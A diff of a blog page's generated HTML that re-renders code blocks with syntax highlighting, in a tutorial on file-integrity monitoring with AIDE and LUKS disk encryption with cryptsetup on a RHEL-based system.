-<pre tabindex="0"><code># Check what repo will provide you aide tool.  
-
-yum whatprovides aide  
-
-# And then install it, if available.  
-
-yum install aide -y
-</code></pre><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GH5ZoirRAKBXJOdkSk4K2A.png" alt="aide-whatprovides-install"  />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># Check what repo will provide you aide tool.  </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">yum</span> <span class="n">whatprovides</span> <span class="n">aide</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># And then install it, if available.  </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">yum</span> <span class="n">install</span> <span class="n">aide</span> <span class="o">-</span><span class="n">y</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GH5ZoirRAKBXJOdkSk4K2A.png" alt="aide-whatprovides-install"  />
 </p>
 <h3 id="next-step-">Next step ..??</h3>
 <p>Let’s check the files unpacked from the <strong>aide package</strong> we just installed.</p>
 <p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*WBBWo0dITSPIgjfNqPTrZA.png" alt="aide-rpm-ql"  />
 </p>
 <p>We found a configuration file — <code>/etc/aide.conf</code>.</p>
-<pre tabindex="0"><code># open the file with vim or your favourite text editor  
-
-vim /etc/aide.conf  
-
-# The file looked very huge so I checked its length.  
-
-wc /etc/aide.conf  
-
-# OUTPUT:  
-# 312 765 7333 /etc/aide.conf
-</code></pre><p>Fortunately they have given a man page for the configurations settings.</p>
-<pre tabindex="0"><code>man 5 aide.conf
-</code></pre><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0HZv3rMcdAFMTbYiyPn_Xw.png" alt="aide.conf"  />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># open the file with vim or your favourite text editor  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">vim /etc/aide.conf  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># The file looked very huge so I checked its length.  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wc /etc/aide.conf  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># OUTPUT:  
+</span></span><span class="line"><span class="cl"># 312 765 7333 /etc/aide.conf
+</span></span></code></pre></div><p>Fortunately they have given a man page for the configurations settings.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man 5 aide.conf
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0HZv3rMcdAFMTbYiyPn_Xw.png" alt="aide.conf"  />
 </p>
 <p>This gives me a good news. There are only 3 types of line in the configuration file.</p>
 <ul>
@@ -1948,10 +1948,10 @@ wc /etc/aide.conf
 <p>You can now check the config file and things will make more sense to you. Also you can check the key-value pairs from <a href="https://linux.die.net/man/5/aide.conf">man page</a>.</p>
 <h3 id="enough-for-configuration-how-to-use-it">Enough for configuration… How to use it?</h3>
 <p>Go to the <a href="https://linux.die.net/man/1/aide">man page</a> of aide.</p>
-<pre tabindex="0"><code># from terminal  
-
-man aide
-</code></pre><p>Again a reminder, and I quote.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># from terminal  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">man aide
+</span></span></code></pre></div><p>Again a reminder, and I quote.</p>
 <blockquote>
 <p>AIDE is an <strong>intrusion detection system</strong> for checking the <strong>integrity of files</strong>.</p>
 </blockquote>
@@ -1975,19 +1975,19 @@ man aide
 <p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4RBSuCrL2W9C1Y9MspWl2w.png" alt="create-folder"  />
 </p>
 <p>Adding my new folder and files to aide.conf</p>
-<pre tabindex="0"><code>#-------------- My-Settings ---------------  
-
-myfilter = sha256  
-
-/fun-with-aide myfilter
-</code></pre><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*aC940c2LfvDHrQu_D4nKoA.png" alt="add-to-conf"  />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#-------------- My-Settings ---------------  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">myfilter = sha256  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/fun-with-aide myfilter
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*aC940c2LfvDHrQu_D4nKoA.png" alt="add-to-conf"  />
 </p>
 <p>This rule is a regular expression rule and will match the complete path of any file starting from /fun-with-aide, so this will include the files inside this folder.</p>
 <p>Now some simple steps to follow:</p>
-<pre tabindex="0"><code>* aide --init
-* cp /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz
-* aide --check
-</code></pre><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*G7iCTRi0C6ttmWQe3-oxyA.png" alt="aide-check"  />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span> <span class="n">aide</span> <span class="o">--</span><span class="n">init</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">cp</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">aide</span><span class="o">/</span><span class="n">aide</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">gz</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">aide</span><span class="o">/</span><span class="n">aide</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">gz</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">aide</span> <span class="o">--</span><span class="n">check</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*G7iCTRi0C6ttmWQe3-oxyA.png" alt="aide-check"  />
 </p>
 <p>What if we tinker with the file /fun-with-aide/file1?</p>
 <p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*wDbGmR7vps5vsqs3i8_Icg.png" alt="tinker-file1"  />
@@ -2001,24 +2001,24 @@ myfilter = sha256
 <p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*ip12LNV58018AQ8G.gif" alt="yeah-automation"  />
 </p>
 <p>Check the below provided simple cron job script to automatically check for the changes. For more complex examples check <a href="https://sources.gentoo.org/cgi-bin/viewvc.cgi/gentoo-x86/app-forensics/aide/files/aide.cron">this</a> and <a href="https://rfxn.com/downloads/cron.aide">this</a>.</p>
-<pre tabindex="0"><code># SOURCE: https://wiki.archlinux.org/index.php/AIDE  
-
-#!/bin/bash -e  
-
-# these should be the same as what&#39;s defined in /etc/aide.conf  
-database=/var/lib/aide/aide.db.gz  
-database\_out=/var/lib/aide/aide.db.new.gz  
-
-if [ ! -f &#34;$database&#34; ]; then  
- echo &#34;$database not found&#34; &gt;&amp;2  
- exit 1  
-fi  
-
-aide -u || true  
-
-mv $database $database.back  
-mv $database\_out $database
-</code></pre><hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># SOURCE: https://wiki.archlinux.org/index.php/AIDE  </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash -e  </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># these should be the same as what&#39;s defined in /etc/aide.conf  </span>
+</span></span><span class="line"><span class="cl"><span class="nv">database</span><span class="o">=</span>/var/lib/aide/aide.db.gz  
+</span></span><span class="line"><span class="cl">database<span class="se">\_</span>out<span class="o">=</span>/var/lib/aide/aide.db.new.gz  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;</span><span class="nv">$database</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>  
+</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$database</span><span class="s2"> not found&#34;</span> &gt;<span class="p">&amp;</span><span class="m">2</span>  
+</span></span><span class="line"><span class="cl"> <span class="nb">exit</span> <span class="m">1</span>  
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">aide -u <span class="o">||</span> <span class="nb">true</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mv <span class="nv">$database</span> <span class="nv">$database</span>.back  
+</span></span><span class="line"><span class="cl">mv <span class="nv">$database</span><span class="se">\_</span>out <span class="nv">$database</span>
+</span></span></code></pre></div><hr>
 <p><strong>What about if attacker changed the database??</strong></p>
 <p>When I checked the file type of the <em>aide.db.gz</em>&hellip; It came out to be a gzip compressed data, from Unix, max compression file.</p>
 <p>This makes it very obvious to unzip this compressed file. I prefer using gunzip tool.</p>
@@ -2055,8 +2055,8 @@ mv $database\_out $database
 <p>Linux Unified Key Encryption — Disk Encryption</p>
 </blockquote>
 <p><strong>cryptsetup</strong> — <em>manage plain dm-crypt and LUKS encrypted volumes</em></p>
-<pre tabindex="0"><code>cryptsetup &lt;OPTIONS&gt; &lt;action&gt; &lt;action-specific-options&gt; &lt;device&gt; &lt;dmname&gt;
-</code></pre><p>An encrypted blockdevice is protected by a key. A key is either:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup &lt;OPTIONS&gt; &lt;action&gt; &lt;action-specific-options&gt; &lt;device&gt; &lt;dmname&gt;
+</span></span></code></pre></div><p>An encrypted blockdevice is protected by a key. A key is either:</p>
 <ul>
 <li>a passphrase, or</li>
 <li>a keyfile</li>
@@ -2097,12 +2097,12 @@ mv $database\_out $database
 <h3 id="just-do-it-now-">Just Do It now ✔️</h3>
 <h3 id="installing-required-tools">Installing required tools</h3>
 <p>I am using a RHEL based OS which uses yum/dnf package managers.</p>
-<pre tabindex="0"><code>yum install cryptsetup -y
-
-or
-
-dnf install -y cryptsetup
-</code></pre><h3 id="creating-the-partition">Creating the partition</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">yum install cryptsetup -y
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">or
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dnf install -y cryptsetup
+</span></span></code></pre></div><h3 id="creating-the-partition">Creating the partition</h3>
 <p><code>lsblk</code> - check the device name for the harddisk (sdb)</p>
 <p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4c6x1UUNyksMWLCc-Yqyaw.png" alt=""  />
 </p>
@@ -2136,15 +2136,15 @@ dnf install -y cryptsetup
 </p>
 <p><em>Type this on magic terminal —</em> <em>restorecon -vvRF /mnt/my_encrypted_backup/</em> <em>- This will restore the SELinux context back to defaults for the destination directory.</em></p>
 <h3 id="checking-luks-dumps">Checking luks dumps</h3>
-<pre tabindex="0"><code>cryptsetup luksDump /dev/sdb1
-</code></pre><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tWyJ8XLcwJuyRG-aUl8BZA.png" alt=""  />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup luksDump /dev/sdb1
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tWyJ8XLcwJuyRG-aUl8BZA.png" alt=""  />
 </p>
 <h3 id="adding-new-key">Adding new key</h3>
-<pre tabindex="0"><code>mkdir /etc/luks-keys/; dd if=/dev/random of=/etc/luks-keys/mybackup\_key bs=32 count=1
-</code></pre><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*fE51gnVtgYGkSOeASgrzfQ.png" alt=""  />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir /etc/luks-keys/; dd if=/dev/random of=/etc/luks-keys/mybackup\_key bs=32 count=1
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*fE51gnVtgYGkSOeASgrzfQ.png" alt=""  />
 </p>
-<pre tabindex="0"><code>cryptsetup luksAddKey /dev/sdb1 /etc/luks-keys/mybackup\_key
-</code></pre><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*FBkoDsoqSHZ9AWw73ICg2Q.png" alt=""  />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup luksAddKey /dev/sdb1 /etc/luks-keys/mybackup\_key
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*FBkoDsoqSHZ9AWw73ICg2Q.png" alt=""  />
 </p>
 <p>Checking the dumps again</p>
 <p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*7pWmoHcrHZmLXtGISkrCZQ.png" alt=""  />
@@ -2161,16 +2161,16 @@ dnf install -y cryptsetup
 <ol>
 <li>If you want to unmount and remove the harddisk. You’ll have to follow the steps:</li>
 </ol>
-<pre tabindex="0"><code>umount /mountpoints/sdb cryptsetup luksClose myencrypt
-</code></pre><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*6JplORU1iMFii5fwR4Reqg.png" alt=""  />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">umount /mountpoints/sdb cryptsetup luksClose myencrypt
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*6JplORU1iMFii5fwR4Reqg.png" alt=""  />
 
 <img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*TZ8IkBpyRwkufkvyPkIT2g.png" alt=""  />
 </p>
 <ol start="2">
 <li>If you want to open the luks partition with keyfile instead of the passphrase.</li>
 </ol>
-<pre tabindex="0"><code>cryptsetup -v luksOpen /dev/sdb1 myencrypt --key-file=/etc/luks-keys/mybackup\_key
-</code></pre><ol start="3">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup -v luksOpen /dev/sdb1 myencrypt --key-file=/etc/luks-keys/mybackup\_key
+</span></span></code></pre></div><ol start="3">
 <li>What if someone changes the content of the keyfile?</li>
 </ol>
 <p>Creating a new key</p>
@@ -2188,8 +2188,8 @@ dnf install -y cryptsetup
 <p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*wasZr_6cKCRIibLohoPJvQ.png" alt=""  />
 </p>
 <p>And make the below entry in <code>/etc/crypttab</code> file. (Check the UUID for your device - Don&rsquo;t copy mine!!)</p>
-<pre tabindex="0"><code>myencrypt    UUID=48a20857-6f26-4352-89d5-e778f2d98950     /etc/luks-keys/mybackup\_key    luks
-</code></pre><p>The above line is a combination of 4 fields:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">myencrypt    UUID=48a20857-6f26-4352-89d5-e778f2d98950     /etc/luks-keys/mybackup\_key    luks
+</span></span></code></pre></div><p>The above line is a combination of 4 fields:</p>
 <ul>
 <li>name of the mapped device.</li>
 <li>uuid of the encrypted partition</li>
@@ -2197,8 +2197,8 @@ dnf install -y cryptsetup
 <li>type of encryption used — luks</li>
 </ul>
 <p>And then make below entry in <code>/etc/fstab</code> file.</p>
-<pre tabindex="0"><code>/dev/mapper/myencrypt /mountpoints/sdb xfs defaults 0 0
-</code></pre><p><em>Want to learn more about</em> <a href="https://linux.die.net/man/5/crypttab"><em>crypttab</em></a> <em>and</em> <a href="https://linux.die.net/man/5/fstab"><em>fstab</em></a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/dev/mapper/myencrypt /mountpoints/sdb xfs defaults 0 0
+</span></span></code></pre></div><p><em>Want to learn more about</em> <a href="https://linux.die.net/man/5/crypttab"><em>crypttab</em></a> <em>and</em> <a href="https://linux.die.net/man/5/fstab"><em>fstab</em></a></p>
 <p>Last step to verify if the above steps worked fine or not.</p>
 <ul>
 <li>Remount and verify (using mount command with &lsquo;a&rsquo; and &lsquo;v&rsquo; flags for clarity)</li>
